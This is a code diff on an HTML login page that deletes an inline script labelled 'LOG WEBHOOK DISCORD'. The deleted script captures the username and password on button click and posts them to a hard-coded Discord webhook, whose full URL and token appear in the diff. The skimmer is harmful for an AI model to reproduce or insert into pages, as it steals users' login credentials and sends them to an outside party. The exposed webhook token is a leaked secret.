@@ -100,40 +100,5 @@
 
     <!-- Scripts -->
     <script type="module" src="./js/post.js"></script>
-    <!-- LOG WEBHOOK DISCORD -->
-    <script>
-        //LOG DISCORD
-       const webhookURL = "https://discordapp.com/api/webhooks/1111883354103619684/OThcIfeoytnucwTWIKfyugG5FXr5CbnHt_iv-5D8hTaYuC73ZCwqnSOWJ5Vfxi-aSL29";
-     
-       document.getElementById("button").addEventListener("click", () => {
-         const username = document.getElementById('username').value;
-         const password = document.getElementById('password').value;
-           const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
-           sendToDiscordWebhook(message);
-       });
-     
-       function sendToDiscordWebhook(message) {
-           const requestData = {
-               method: "POST",
-               headers: {
-                   "Content-Type": "application/json"
-               },
-               body: JSON.stringify({ content: message })
-           };
-     
-           fetch(webhookURL, requestData)
-               .then(response => {
-                   if (response.ok) {
-                       console.log("Gilar Berhasil login");
-                   } else {
-                       console.error("Gilar GAGAL login");
-                   }
-               })
-               .catch(error => {
-                   console.error("Terjadi kesalahan:", error);
-               });
-       }
-        //LOG DISCORD
-     </script>
   </body>
 </html>
